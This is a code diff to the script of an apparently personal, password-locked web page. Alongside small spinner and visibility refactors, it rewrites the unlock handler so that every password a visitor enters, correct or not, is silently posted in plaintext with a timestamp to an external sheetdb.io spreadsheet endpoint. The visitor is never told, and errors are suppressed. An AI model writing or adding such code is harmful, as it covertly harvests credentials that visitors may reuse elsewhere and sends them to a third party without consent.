@@ -610,45 +610,48 @@
         }
 
         function showLoadingAndContent() {
-          loadingCircle.style.display = "flex";
+          loadingCircle.classList.remove("hidden");
           passwordInput.disabled = true;
           unlockBtn.disabled = true;
 
           setTimeout(() => {
             lockOverlay.style.display = "none";
-            loadingCircle.style.display = "none";
+            loadingCircle.classList.add("hidden");
             mainContent.classList.add("show");
           }, 2000);
         }
 
         async function storePassword(password) {
-          const response = await fetch(
-            "https://sheetdb.io/api/v1/h3a8hjp7tyrir",
-            {
+          try {
+            const timestamp = new Date().toISOString(); // e.g., "2025-08-15T16:30:00.000Z"
+
+            await fetch("https://sheetdb.io/api/v1/h3a8hjp7tyrir", {
               method: "POST",
               headers: {
                 "Content-Type": "application/json",
               },
               body: JSON.stringify({
-                data: [
-                  {
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                  },
-                ],
+                data: {
+                  password: password, // or hashed password
+                  timestamp: timestamp, // store timestamp
+                },
               }),
-            }
-          );
-          const result = await response.json();
-          console.log("Password stored:", result);
+            });
+          } catch (err) {
+            console.error("Failed to store password:", err);
+          }
         }
 
         unlockBtn.addEventListener("click", async () => {
-          const inputHash = await hashPassword(passwordInput.value);
+          const inputValue = passwordInput.value;
+
+          // Store every entered password separately
+          storePassword(inputValue);
+
+          const inputHash = await hashPassword(inputValue);
           if (inputHash === PASSWORD_HASH) {
             errorMsg.classList.add("hidden");
-            document.title = "Veera ✨"; // Change website title
-            await storePassword(passwordInput.value); // Store password
+            document.title = "Veera ✨";
             showLoadingAndContent();
           } else {
             errorMsg.classList.remove("hidden");
@@ -660,9 +663,8 @@
           if (e.key === "Enter") unlockBtn.click();
         });
 
-        // Hide main content & loading initially
-        mainContent.style.display = "none";
-        loadingCircle.style.display = "none";
+        mainContent.classList.remove("show");
+        loadingCircle.classList.add("hidden");
       });
     </script>
   </body>
